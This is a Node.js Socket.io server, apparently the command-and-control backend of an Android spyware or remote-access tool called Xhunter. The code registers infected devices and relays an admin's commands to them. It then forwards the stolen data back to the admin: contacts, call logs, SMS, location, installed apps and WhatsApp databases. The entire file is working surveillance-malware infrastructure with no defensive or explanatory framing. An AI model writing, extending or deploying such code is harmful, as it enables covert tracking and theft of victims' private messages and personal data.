const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);

app.use(cors());
const io = new Server(server, {
  maxHttpBufferSize: 1e8,
  cors: { origin: "*", methods: ["GET","POST"], credentials: true }
});

const port = process.env.PORT || 8080;
server.listen(port, () => console.log(`[LOG] Server running on port ${port}`));

let adminSocketId = null;
let devices = {};

app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req,res) => res.send('Welcome to Xhunter Backend Server!'));

io.on('connection', (socket) => {
  console.log(`[LOG] Socket connected: ${socket.id}`);

  // Admin joins
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    Object.values(devices).forEach(d => socket.emit('join', d));
    console.log(`[LOG] Admin connected: ${socket.id}`);
  });

  // Client joins
  socket.on('join', (device) => {
    devices[device.id] = { ...device, socketId: socket.id };
    if(adminSocketId) io.to(adminSocketId).emit('join', devices[device.id]);
    console.log(`[LOG] Device joined: ${device.id}`);
  });

  // Admin sends command
  socket.on('request', (msg) => {
    const { to, action, data } = JSON.parse(msg);
    if(devices[to]) io.to(devices[to].socketId).emit(action, data);
    console.log(`[LOG] Request: ${action} -> ${to}`);
  });

  // Client sends data
  const deviceEvents = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
  deviceEvents.forEach(ev => {
    socket.on(ev, (data) => {
      if(adminSocketId) io.to(adminSocketId).emit(ev, data);
      console.log(`[DATA] ${ev} from ${socket.id}`);
    });
  });

  // Disconnect
  socket.on('disconnect', () => {
    Object.keys(devices).forEach(id => {
      if(devices[id].socketId === socket.id) delete devices[id];
    });
    if(adminSocketId) io.to(adminSocketId).emit('updateDevices', devices);
    console.log(`[LOG] Socket disconnected: ${socket.id}`);
  });
});
